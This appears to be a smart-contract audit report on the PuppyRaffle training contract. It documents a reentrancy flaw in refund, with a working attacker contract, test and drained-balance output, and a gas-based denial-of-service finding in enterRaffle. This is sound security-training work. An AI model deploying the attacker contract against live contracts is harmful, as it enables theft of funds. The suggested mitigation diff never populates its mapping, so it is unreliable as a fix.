## [H-#] In **`PuppyRaffle::refund`** external call is being made before the state is updated, this will become an easy target for **Reentancy** attack.

### Description:
> The **`PuppyRaffle::refund`** sends the refund value back to player before updating the `players` array. Due to this a malicious user can carry out a reentrancy attack using a malicious Smart contract to drain all the money present in `PuppyRaffle`. This will surely discourage the users from entring into the raffle.


### Impact: 
> All the money being stored in the `PuppyRaffle` contract is not safe, as anyone can exploit the system and take away all the money. This will cause other players to loose a lot of money and will drastically destroy your reputation.

### Proof of Concept:

<details>
<summary>PoC- Attack Contract</summary>

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

</details>

<details>
<summary>PoC- Test Func</summary>

```java
function testReentrancyAttack() public playerEntered {
    address[] memory players = new address[](4);
    players[0] = address(10);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker reentrancyAttackContract = new ReentrancyAttacker(
        puppyRaffle
    );
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);
    uint256 startingPuppyBalance = address(puppyRaffle).balance;
    uint256 startingAttackContractBalance = address(
        reentrancyAttackContract
    ).balance;

    vm.prank(attacker);
    reentrancyAttackContract.attack{value: entranceFee}();

    console.log(
        "Attack Contract Balance (Start): ",
        startingAttackContractBalance
    );
    console.log("Puppy Contract Balance (Start): ", startingPuppyBalance);
    console.log(
        "Attack Contract Balance (End): ",
        address(reentrancyAttackContract).balance
    );
    console.log(
        "Puppy Contract Balance (End): ",
        address(puppyRaffle).balance
    );
}
```

</details>

<details>
<summary>Output</summary>

```
[PASS] testReentrancyAttack() (gas: 538395)
Logs:
  Attack Contract Balance (Start):  0
  Puppy Contract Balance (Start):  5000000000000000000
  Attack Contract Balance (End):  6000000000000000000
  Puppy Contract Balance (End):  0
```

</details>



### Recommended Mitigation:

> Always try to update state before making any external calls.<br>
> Can use `Openzeppelin::ReentrancyGuard`



## [M-#] Unbounded For loop in **`PuppyRaffle::enterRaffle`** is a potential Denial of Service (DoS) atatck, leads to increament of gas cost for later entrants

### Description:
> The **`PuppyRaffle::enterRaffle`** functions has a *for* loop that loops through `players` array to check for duplicate players. But the longer the `players` array is the longer the checks will be, so, the players joining very late will have to incur huge gas cost compared to those players who joins first. This gives a very huge advantage to earlier players. So more players will lead to more gas cost.

### Impact: 
> The `gas cost` to enter raffle will dramatically increase as more players enter the raffle. This will discourage more players from entering the raffle.<br>
> An Attacker may make `PuppyRaffle::players` array so big that no one else can enter the raffle, guranteeing themselves the win.

### Proof of Concept:

If we have 2 batch of players, 100 in each batch;<br>
- 1st 100 ~ 6252039 gas<br>
- 2nd 100 ~ 18067744 gas<br>

From aboce data it is evident that gas cost becomes 3x for the 2nd batch of players. This will become even worse if more players start to join.

<details>
<summary>PoC</summary>

```java
function testDOSAttackEnterRaffle() public {
      vm.txGasPrice(1);
      // Gas cost #1
      // making 100 players
      uint256 n = 100;
      address[] memory players = new address[](n);
      for (uint256 i = 0; i < n; i++) {
          players[i] = address(i);
      }
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee*100}(players);
      // Gas cost #2
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart-gasEnd)*tx.gasprice;
      console.log("1st 100 players: ",gasUsedFirst);

      for (uint256 i = 0; i < n; i++) {
          players[i] = address(i + n);
      }
      uint256 gasStart1 = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee*100}(players);
      // Gas cost #2
      uint256 gasEnd1 = gasleft();
      uint256 gasUsedFirst1 = (gasStart1-gasEnd1)*tx.gasprice;
      console.log("2nd 100 players: ",gasUsedFirst1);
      assert(gasUsedFirst1>gasUsedFirst);
  }
```

</details>

### Recommended Mitigation:

> There are few recomendations.<br>

1. Consider allowing duplicates. Users can easily make new wallet addresses, so, duplicate check won't stop a user to enter multiple times.
2. Consider using **mappings** for doing duplicate checks rather than using for loops.

```diff
+     mapping(address => uint256) public playeraddressTopresence;

function enterRaffle(address[] memory newPlayers) public payable {
        // @Q: were "custom reverts" for 0.7.6
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }
        
+        for (uint256 i = 0; i < newPlayers.length; i++) {
+            require(playeraddressTopresence[players[i]] < 1, "Duplicate players");
+        }

        // Check for duplicates
        // @Audit:: DoS Attack [High]
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }


        emit RaffleEnter(newPlayers);
    }

```


## [S-#] TITLE (Root Cause + Impact)

### Description:

### Impact: 

### Proof of Concept:

### Recommended Mitigation:

